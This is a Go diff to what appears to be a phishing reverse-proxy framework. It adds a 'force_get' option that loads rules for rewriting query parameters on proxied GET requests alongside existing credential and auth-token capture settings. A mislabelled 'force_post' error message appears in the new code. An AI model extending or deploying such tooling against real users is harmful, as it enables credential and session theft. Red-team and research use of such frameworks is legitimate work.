@@ -84,6 +84,23 @@ type ForcePost struct {
 	tp     string            `mapstructure:"type"`
 }
 
+type ForceGetSearch struct {
+	key    *regexp.Regexp `mapstructure:"key"`
+	search *regexp.Regexp `mapstructure:"search"`
+}
+
+type ForceGetForce struct {
+	key   string `mapstructure:"key"`
+	value string `mapstructure:"value"`
+}
+
+type ForceGet struct {
+	path   *regexp.Regexp    `mapstructure:"path"`
+	search []ForceGetSearch  `mapstructure:"search"`
+	force  []ForceGetForce   `mapstructure:"force"`
+	tp     string            `mapstructure:"type"`
+}
+
 type LoginUrl struct {
 	domain string `mapstructure:"domain"`
 	path   string `mapstructure:"path"`
@@ -125,6 +142,7 @@ type Phishlet struct {
 	landing_path     []string
 	cfg              *Config
 	custom           []PostField
+	forceGet         []ForceGet
 	forcePost        []ForcePost
 	login            LoginUrl
 	js_inject        []JsInject
@@ -198,6 +216,23 @@ type ConfigForcePost struct {
 	Type   *string                  `mapstructure:"type"`
 }
 
+type ConfigForceGetSearch struct {
+	Key    *string `mapstructure:"key"`
+	Search *string `mapstructure:"search"`
+}
+
+type ConfigForceGetForce struct {
+	Key   *string `mapstructure:"key"`
+	Value *string `mapstructure:"value"`
+}
+
+type ConfigForceGet struct {
+	Path   *string                  `mapstructure:"path"`
+	Search *[]ConfigForceGetSearch  `mapstructure:"search"`
+	Force  *[]ConfigForceGetForce   `mapstructure:"force"`
+	Type   *string                  `mapstructure:"type"`
+}
+
 type ConfigLogin struct {
 	Domain *string `mapstructure:"domain"`
 	Path   *string `mapstructure:"path"`
@@ -227,6 +262,7 @@ type ConfigPhishlet struct {
 	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
 	AuthUrls    []string           `mapstructure:"auth_urls"`
 	Credentials *ConfigCredentials `mapstructure:"credentials"`
+	ForceGets   *[]ConfigForceGet  `mapstructure:"force_get"`
 	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
 	LandingPath *[]string          `mapstructure:"landing_path"`
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
@@ -693,13 +729,76 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		}
 	}
 
+	if fp.ForceGets != nil {
+		for _, op := range *fp.ForceGets {
+			var err error
+			if op.Path == nil || *op.Path == "" {
+				return fmt.Errorf("force_post: missing or empty `path` field")
+			}
+			tp := "query"
+			if (op.Type != nil) {
+				tp = *op.Type
+			}
+			if (tp != "query") {
+				return fmt.Errorf("force_get: unknown type - only 'query' is currently supported")
+			}
+			if op.Force == nil || len(*op.Force) == 0 {
+				return fmt.Errorf("force_get: missing or empty `force` field")
+			}
+
+			fpf := ForceGet{}
+			fpf.path, err = regexp.Compile(p.paramVal(*op.Path))
+			if err != nil {
+				return err
+			}
+			fpf.tp = tp
+
+			if op.Search != nil {
+				for _, op_s := range *op.Search {
+					if op_s.Key == nil {
+						return fmt.Errorf("force_get: missing search `key` field")
+					}
+					if op_s.Search == nil {
+						return fmt.Errorf("force_get: missing search `search` field")
+					}
+
+					f_s := ForceGetSearch{}
+					f_s.key, err = regexp.Compile(p.paramVal(*op_s.Key))
+					if err != nil {
+						return err
+					}
+					f_s.search, err = regexp.Compile(p.paramVal(*op_s.Search))
+					if err != nil {
+						return err
+					}
+					fpf.search = append(fpf.search, f_s)
+				}
+			}
+			for _, op_f := range *op.Force {
+				if op_f.Key == nil {
+					return fmt.Errorf("force_get: missing force `key` field")
+				}
+				if op_f.Value == nil {
+					return fmt.Errorf("force_get: missing force `value` field")
+				}
+
+				f_f := ForceGetForce{
+					key:   p.paramVal(*op_f.Key),
+					value: p.paramVal(*op_f.Value),
+				}
+				fpf.force = append(fpf.force, f_f)
+			}
+			p.forceGet = append(p.forceGet, fpf)
+		}
+	}
+
 	if fp.ForcePosts != nil {
 		for _, op := range *fp.ForcePosts {
 			var err error
 			if op.Path == nil || *op.Path == "" {
 				return fmt.Errorf("force_post: missing or empty `path` field")
 			}
-			if op.Type == nil || *op.Type != "post" {
+			if op.Type == nil || (*op.Type != "post") {
 				return fmt.Errorf("force_post: unknown type - only 'post' is currently supported")
 			}
 			if op.Force == nil || len(*op.Force) == 0 {
